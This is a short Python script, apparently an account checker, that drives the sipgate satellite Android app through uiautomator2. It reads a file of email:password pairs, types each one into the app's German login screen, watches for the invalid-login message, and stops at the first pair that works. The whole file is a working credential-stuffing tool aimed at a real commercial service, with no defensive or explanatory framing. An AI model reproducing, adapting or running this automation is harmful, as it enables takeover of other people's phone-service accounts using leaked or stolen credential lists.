mport uiautomator2 as u2
import time

entrada_db = str(input("Chame o arquivo: "))

d = u2.connect()
d.wait_timeout = 10

with open(entrada_db, "r", encoding="utf-8") as f:
    for linha in f:
        linha = linha.strip()

        if not linha or ":" not in linha:
            continue

        usuario, senha = linha.split(":", 1)

        print(f"\nTestando: {usuario} | {senha}")

        d.app_start("de.sipgate.app.satellite")
        time.sleep(2)

        if d(text="Anmelden").exists:
            d(text="Anmelden").click()


        time.sleep(2)
        if d(text="E-Mail-Adresse").exists:
            d(text="E-Mail-Adresse").click()
            d.clear_text()
            d.send_keys(usuario)


        time.sleep(1)
        if d(text="Passwort").exists:
            d(text="Passwort").click()
            d.clear_text()
            d.send_keys(senha)

        time.sleep(1)
        if d(text="Weiter").exists:
            d(text="Weiter").click()

        time.sleep(3)

        erro = d(text="Ungültiger Login. Bitte überprüfe deine E-Mail-Adresse und dein Passwort.").exists

        if erro:
            print(f"❌ Login falhou: {usuario}")
            d.app_stop("de.sipgate.app.satellite")
            time.sleep(2)
            continue
            
        else:
            print(f"✅ Login funcionou: {usuario}")
            break

print("Finalizado | BY Walker")
d.app_start("com.termux")
